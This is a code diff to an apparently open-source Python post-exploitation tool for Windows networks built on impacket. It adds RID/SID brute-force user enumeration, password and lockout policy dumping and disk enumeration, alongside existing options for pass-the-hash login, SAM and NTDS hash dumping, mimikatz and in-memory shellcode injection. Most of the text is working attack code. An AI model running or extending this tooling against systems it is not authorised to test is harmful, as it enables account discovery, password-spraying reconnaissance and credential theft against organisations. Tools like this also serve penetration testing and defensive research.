@@ -12,11 +12,12 @@ from threading import Thread
 from base64 import b64encode
 from struct import unpack, pack
 from collections import OrderedDict
-from impacket import smbserver, ntlm, winregistry
-from impacket.dcerpc.v5 import transport, scmr, samr, drsuapi, rrp, tsch, srvs, wkst, epm
+from impacket import smbserver, ntlm, winregistry, uuid, ImpactPacket
+from impacket.dcerpc.v5 import transport, scmr, samr, drsuapi, rrp, tsch, srvs, wkst, epm, lsat, lsad, dtypes
+from impacket.dcerpc.v5.samr import SID_NAME_USE
 from impacket.dcerpc.v5.dcomrt import DCOMConnection
 from impacket.dcerpc.v5.dcom import wmi
-from impacket.dcerpc.v5.dtypes import NULL, OWNER_SECURITY_INFORMATION
+from impacket.dcerpc.v5.dtypes import NULL, OWNER_SECURITY_INFORMATION, MAXIMUM_ALLOWED
 from impacket.dcerpc.v5.rpcrt import DCERPCException, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_GSS_NEGOTIATE
 from impacket.ese import ESENT_DB
 from impacket.structure import Structure
@@ -28,7 +29,7 @@ from argparse import RawTextHelpFormatter
 from binascii import unhexlify, hexlify
 from Crypto.Cipher import DES, ARC4
 from datetime import datetime
-from time import ctime, time
+from time import ctime, time, strftime, gmtime
 from termcolor import cprint, colored
 
 import StringIO
@@ -36,6 +37,7 @@ import csv
 import ntpath
 import socket
 import hashlib
+import codecs
 import BaseHTTPServer
 import logging
 import argparse
@@ -1625,8 +1627,7 @@ class SAMRDump:
         if hashes:
             self.__lmhash, self.__nthash = hashes.split(':')
 
-
-    def dump(self, addr):
+    def connect(self, addr):
         """Dumps the list of users and shares registered present at
         addr. Addr is a valid host name or IP address.
         """
@@ -1639,46 +1640,107 @@ class SAMRDump:
 
             #logging.info("Trying protocol %s..." % protocol)
             rpctransport = transport.SMBTransport(addr, port, r'\samr', self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, self.__aesKey, doKerberos = self.__doKerberos)
+            dce = rpctransport.get_dce_rpc()
 
-            try:
-                return self.__fetchList(rpctransport)
-            except Exception, e:
-                logging.info(str(e))
-            else:
-                # Got a response. No need for further iterations.
-                break
+            dce.connect()
+            dce.bind(samr.MSRPC_UUID_SAMR)
 
-    def __fetchList(self, rpctransport):
-        dce = rpctransport.get_dce_rpc()
-
-        entries = {'users': []}
-
-        dce.connect()
-        dce.bind(samr.MSRPC_UUID_SAMR)
-
-        try:
             resp = samr.hSamrConnect(dce)
             serverHandle = resp['ServerHandle'] 
 
             resp = samr.hSamrEnumerateDomainsInSamServer(dce, serverHandle)
             domains = resp['Buffer']['Buffer']
 
-            #logging.info("Looking up users in domain %s" % domains[0]['Name'])
-
-            resp = samr.hSamrLookupDomainInSamServer(dce, serverHandle,domains[0]['Name'] )
+            resp = samr.hSamrLookupDomainInSamServer(dce, serverHandle, domains[0]['Name'])
 
             resp = samr.hSamrOpenDomain(dce, serverHandle = serverHandle, domainId = resp['DomainId'])
             domainHandle = resp['DomainHandle']
 
-            resp = samr.hSamrQueryInformationDomain(dce, domainHandle)
-            lthresh =  resp['Buffer']['General2']['LockoutThreshold']
-            entries["lthresh"] = lthresh
+            return rpctransport, dce, domainHandle
 
-            if lthresh != 0:
-                entries['lduration'] = (resp['Buffer']['General2']['LockoutDuration'] / -600000000)
+    def convert(self, low, high, no_zero):
+
+        if low == 0 and hex(high) == "-0x80000000":
+            return "Not Set"
+        if low == 0 and high == 0:
+            return "None"
+        if no_zero: # make sure we have a +ve vale for the unsined int
+            if (low != 0):
+                high = 0 - (high+1)
             else:
-                entries['lduration'] = 0
+                high = 0 - (high)
+            low = 0 - low
+        tmp = low + (high)*16**8 # convert to 64bit int
+        tmp *= (1e-7) #  convert to seconds
+        try:
+            minutes = int(strftime("%M", gmtime(tmp)))  # do the conversion to human readable format
+        except ValueError, e:
+            return "BAD TIME:"
+        hours = int(strftime("%H", gmtime(tmp)))
+        days = int(strftime("%j", gmtime(tmp)))-1
+        time = ""
+        if days > 1:
+         time = str(days) + " days "
+        elif days == 1:
+            time = str(days) + " day "
+        if hours > 1:
+            time += str(hours) + " hours "
+        elif hours == 1:
+            time = str(days) + " hour " 
+        if minutes > 1:
+            time += str(minutes) + " minutes"
+        elif minutes == 1:
+            time = str(days) + " minute "
+        return time
 
+    def get_pass_pol(self, host):
+        rpctransport, dce, domainHandle = self.connect(host)
+
+        res_list = []
+
+        resp = samr.hSamrQueryInformationDomain(dce, domainHandle, samr.DOMAIN_INFORMATION_CLASS.DomainPasswordInformation)
+        
+        min_pass_len = resp['Buffer']['Password']['MinPasswordLength']
+        if min_pass_len == 0: min_pass_len = None
+
+        pass_hst_len = resp['Buffer']['Password']['PasswordHistoryLength']
+        if pass_hst_len == 0: pass_hst_len = None
+
+        res_list.append('Minimum password length: {}'.format(min_pass_len))
+        res_list.append('Password history length: {}'.format(pass_hst_len))
+
+        max_pass_age = self.convert(resp['Buffer']['Password']['MaxPasswordAge']['LowPart'], 
+                                    resp['Buffer']['Password']['MaxPasswordAge']['HighPart'],
+                                    1)
+
+        min_pass_age = self.convert(resp['Buffer']['Password']['MinPasswordAge']['LowPart'], 
+                                    resp['Buffer']['Password']['MinPasswordAge']['HighPart'],
+                                    1)
+        if max_pass_age == 0: max_pass_age = None
+        if min_pass_age == 0: min_pass_age = None
+
+        res_list.append('Maximum password age: {}'.format(max_pass_age))
+        res_list.append('Minimum password age: {}'.format(min_pass_age))
+
+        resp = samr.hSamrQueryInformationDomain2(dce, domainHandle,samr.DOMAIN_INFORMATION_CLASS.DomainLockoutInformation)
+
+        lock_threshold = int(resp['Buffer']['Lockout']['LockoutThreshold'])
+        if lock_threshold == 0: lock_threshold = None
+
+        res_list.append("Account lockout threshold: {}".format(lock_threshold))
+
+        lock_duration = None
+        if lock_threshold is not None: lock_duration = int(resp['Buffer']['Lockout']['LockoutDuration']) / -600000000
+
+        res_list.append("Account lockout duration: {}".format(lock_duration))
+
+        return res_list
+
+    def get_users(self, host):
+        rpctransport, dce, domainHandle = self.connect(host)
+        entries = []
+
+        try:
             status = STATUS_MORE_ENTRIES
             enumerationContext = 0
             while status == STATUS_MORE_ENTRIES:
@@ -1693,14 +1755,13 @@ class SAMRDump:
                     r = samr.hSamrOpenUser(dce, domainHandle, samr.MAXIMUM_ALLOWED, user['RelativeId'])
 
                     info = samr.hSamrQueryInformationUser2(dce, r['UserHandle'],samr.USER_INFORMATION_CLASS.UserAllInformation)
-                    #entry = (user['Name'], user['RelativeId'], info['Buffer']['All'])
-                    entries['users'].append(user['Name'])
+                    entries.append((user['Name'], user['RelativeId'], info['Buffer']['All']))
                     samr.hSamrCloseHandle(dce, r['UserHandle'])
 
                 enumerationContext = resp['EnumerationContext'] 
                 status = resp['ErrorCode']
 
-        except ListUsersException, e:
+        except ListUsersException as e:
             logging.info("Error listing users: %s" % e)
 
         dce.disconnect()
@@ -2231,6 +2292,106 @@ class WMIQUERY:
 
         return record_dict
 
+class LSALookupSid:
+    KNOWN_PROTOCOLS = {
+        '139/SMB': (r'ncacn_np:%s[\pipe\lsarpc]', 139),
+        '445/SMB': (r'ncacn_np:%s[\pipe\lsarpc]', 445),
+        }
+
+    def __init__(self, username, password, domain, protocols = None, hashes = None, maxRid=4000):
+        if not protocols:
+            protocols = LSALookupSid.KNOWN_PROTOCOLS.keys()
+
+        self.__username = username
+        self.__password = password
+        self.__protocols = [protocols]
+        self.__maxRid = int(maxRid)
+        self.__domain = domain
+        self.__lmhash = ''
+        self.__nthash = ''
+        if hashes is not None:
+            self.__lmhash, self.__nthash = hashes.split(':')
+
+    def dump(self, addr):
+
+        logging.info('Brute forcing SIDs at %s' % addr)
+
+        # Try all requested protocols until one works.
+        for protocol in self.__protocols:
+            protodef = LSALookupSid.KNOWN_PROTOCOLS[protocol]
+            port = protodef[1]
+
+            logging.info("Trying protocol %s..." % protocol)
+            stringbinding = protodef[0] % addr
+
+            rpctransport = transport.DCERPCTransportFactory(stringbinding)
+            rpctransport.set_dport(port)
+            if hasattr(rpctransport, 'set_credentials'):
+                # This method exists only for selected protocol sequences.
+                rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
+
+            try:
+                self.__bruteForce(rpctransport, self.__maxRid)
+            except Exception, e:
+                logging.critical(str(e))
+                raise
+            else:
+                # Got a response. No need for further iterations.
+                break
+
+    def __bruteForce(self, rpctransport, maxRid):
+        dce = rpctransport.get_dce_rpc()
+        entries = []
+        dce.connect()
+
+        # Want encryption? Uncomment next line
+        # But make SIMULTANEOUS variable <= 100
+        #dce.set_auth_level(ntlm.NTLM_AUTH_PKT_PRIVACY)
+
+        # Want fragmentation? Uncomment next line
+        #dce.set_max_fragment_size(32)
+
+        dce.bind(lsat.MSRPC_UUID_LSAT)
+        resp = lsat.hLsarOpenPolicy2(dce, MAXIMUM_ALLOWED | lsat.POLICY_LOOKUP_NAMES)
+        policyHandle = resp['PolicyHandle']
+
+        resp = lsad.hLsarQueryInformationPolicy2(dce, policyHandle, lsad.POLICY_INFORMATION_CLASS.PolicyAccountDomainInformation)
+
+        domainSid = resp['PolicyInformation']['PolicyAccountDomainInfo']['DomainSid'].formatCanonical()
+
+        soFar = 0
+        SIMULTANEOUS = 1000
+        for j in range(maxRid/SIMULTANEOUS+1):
+            if (maxRid - soFar) / SIMULTANEOUS == 0:
+                sidsToCheck = (maxRid - soFar) % SIMULTANEOUS
+            else: 
+                sidsToCheck = SIMULTANEOUS
+ 
+            if sidsToCheck == 0:
+                break
+
+            sids = []
+            for i in xrange(soFar, soFar+sidsToCheck):
+                sids.append(domainSid + '-%d' % i)
+            try:
+                lsat.hLsarLookupSids(dce, policyHandle, sids,lsat.LSAP_LOOKUP_LEVEL.LsapLookupWksta)
+            except DCERPCException, e:
+                if str(e).find('STATUS_NONE_MAPPED') >= 0:
+                    soFar += SIMULTANEOUS
+                    continue
+                elif str(e).find('STATUS_SOME_NOT_MAPPED') >= 0:
+                    resp = e.get_packet()
+                else: 
+                    raise
+
+            for n, item in enumerate(resp['TranslatedNames']['Names']):
+                if item['Use'] != SID_NAME_USE.SidTypeUnknown:
+                    entries.append("{}: {}\\{} ({})".format(soFar+n, resp['ReferencedDomains']['Domains'][item['DomainIndex']]['Name'], item['Name'], SID_NAME_USE.enumItems(item['Use']).name))
+            soFar += SIMULTANEOUS
+
+        self.entries = entries
+        dce.disconnect()
+
 class RPCENUM():
     def __init__(self, username, password, domain='', hashes=None):
         self.__username = username
@@ -2290,6 +2451,15 @@ class RPCENUM():
 
         #resp = srvs.hNetrSessionEnum(dce, NULL, NULL, 10)
         #resp.dump()
+
+    def enum_disks(self, host):
+        dce, rpctransport = self.connect(host, 'srvsvc')
+        try:
+            resp = srvs.hNetrServerDiskEnum(dce, 1)
+            return resp
+        except Exception:
+            resp = srvs.hNetrServerDiskEnum(dce, 0)
+            return resp
 
 def smart_login(host, smb, domain):
     if args.combo_file:
@@ -2599,6 +2769,35 @@ def connect(host):
                         print "{} {}".format(fname, yellow(luser[fname]))
                     print "\n"
 
+            if args.enum_disks:
+                rpcenum = RPCENUM(args.user, args.passwd, domain, args.hash)
+                disks = rpcenum.enum_disks(host)
+                print_succ("{}:{} {} Available disks:".format(host, args.port, s_name))
+                for disk in disks['DiskInfoStruct']['Buffer']:
+                    for dname in disk.fields.keys():
+                        print_att(disk[dname])
+
+            if args.rid_brute:
+                lookup = LSALookupSid(args.user, args.passwd, domain, '{}/SMB'.format(args.port), args.hash, args.rid_brute)
+                lookup.dump(host)
+                print_succ("{}:{} {} Dumping users (rid:domain:user):".format(host, args.port, s_name))
+                for user in lookup.entries:
+                    print_att(user)
+
+            if args.pass_pol:
+                dumper =  SAMRDump("{}/SMB".format(args.port), args.user, args.passwd, domain, args.hash)
+                pass_policy = dumper.get_pass_pol(host)
+                print_succ("{}:{} {} Dumping password policies:".format(host, args.port, s_name))
+                for policy in pass_policy:
+                    print_att(policy)
+
+            if args.enum_users:
+                user_enum = SAMRDump("{}/SMB".format(args.port), args.user, args.passwd, domain, args.hash)
+                users = user_enum.get_users(host)
+                print_succ("{}:{} {} Dumping users (rid:user):".format(host, args.port, s_name))
+                for user in users:
+                    print_att('{}: {}'.format(user[1], user[0]))
+
             if args.sam:
                 sam_dump = DumpSecrets(host, args.user, args.passwd, domain, args.hash, True)
                 sam_dump.dump(smb)
@@ -2615,7 +2814,7 @@ def connect(host):
                 vss   = False
                 ninja = False
                 if args.ntds == 'vss': vss = True
-                if args.ntds == 'ninja': ninja = True
+                elif args.ntds == 'ninja': ninja = True
 
                 ntds_dump = DumpSecrets(host, args.user, args.passwd, domain, args.hash, False, True, vss, ninja)
                 ntds_dump.dump(smb)
@@ -2627,10 +2826,6 @@ def connect(host):
                     for h in ntds_dump.dumped_ntds_hashes['kerb']:
                         print_att(h)
                 ntds_dump.cleanup()
-
-            if args.enum_users:
-                user_dump = SAMRDump("{}/SMB".format(args.port), args.user, args.passwd, domain, args.hash).dump(host)
-                print_succ("{}:{} {} {} ( LockoutTries={} LockoutTime={} )".format(host, args.port, s_name, yellow(user_dump['users']), user_dump['lthresh'], user_dump['lduration']))
 
             if args.mimikatz:
                 noOutput = True
@@ -2759,7 +2954,10 @@ if __name__ == '__main__':
     egroup = parser.add_argument_group("Mapping/Enumeration", "Options for Mapping/Enumerating")
     egroup.add_argument("--shares", action="store_true", dest="list_shares", help="List shares")
     egroup.add_argument("--sessions", action='store_true', dest='enum_sessions', help='Enumerate active sessions')
+    egroup.add_argument('--disks', action='store_true', dest='enum_disks', help='Enumerate disks')
     egroup.add_argument("--users", action='store_true', dest='enum_users', help='Enumerate users')
+    egroup.add_argument("--rid-brute", metavar='MAX_RID', dest='rid_brute', help='Enumerate users by bruteforcing RID\'s')
+    egroup.add_argument("--pass-pol", action='store_true', dest='pass_pol', help='Dump password policy')
     egroup.add_argument("--lusers", action='store_true', dest='enum_lusers', help='Enumerate logged on users')
     egroup.add_argument("--wmi", metavar='QUERY', type=str, dest='wmi_query', help='Issues the specified WMI query')
 
@@ -2774,13 +2972,13 @@ if __name__ == '__main__':
     cgroup.add_argument("-x", metavar="COMMAND", dest='command', help="Execute the specified command")
     cgroup.add_argument("-X", metavar="PS_COMMAND", dest='pscommand', help='Excute the specified powershell command')
 
-    xgroup = parser.add_argument_group("Shellcode/EXE/DLL injection", "Options for injecting Shellcode/EXE/DLL's in memory using PowerShell")
+    xgroup = parser.add_argument_group("Shellcode/EXE/DLL Injection", "Options for injecting Shellcode/EXE/DLL's in memory using PowerShell")
     xgroup.add_argument("--inject", choices={'shellcode', 'exe', 'dll'}, help='Inject Shellcode, EXE or a DLL')
     xgroup.add_argument("--path", type=str, help='Path to the Shellcode/EXE/DLL you want to inject on the target systems')
     xgroup.add_argument('--procid', type=int, help='Process ID to inject the Shellcode/EXE/DLL into (if omitted, will inject within the running PowerShell process)')
     xgroup.add_argument("--exeargs", type=str, help='Arguments to pass to the EXE being reflectively loaded (ignored if not injecting an EXE)')
 
-    bgroup = parser.add_argument_group("Filesystem interaction", "Options for interacting with filesystems")
+    bgroup = parser.add_argument_group("Filesystem Interaction", "Options for interacting with filesystems")
     bgroup.add_argument("--list", metavar='PATH', help='List contents of a directory')
     bgroup.add_argument("--download", metavar="PATH", help="Download a file from the remote systems")
     bgroup.add_argument("--upload", nargs=2, metavar=('SRC', 'DST'), help="Upload a file to the remote systems")
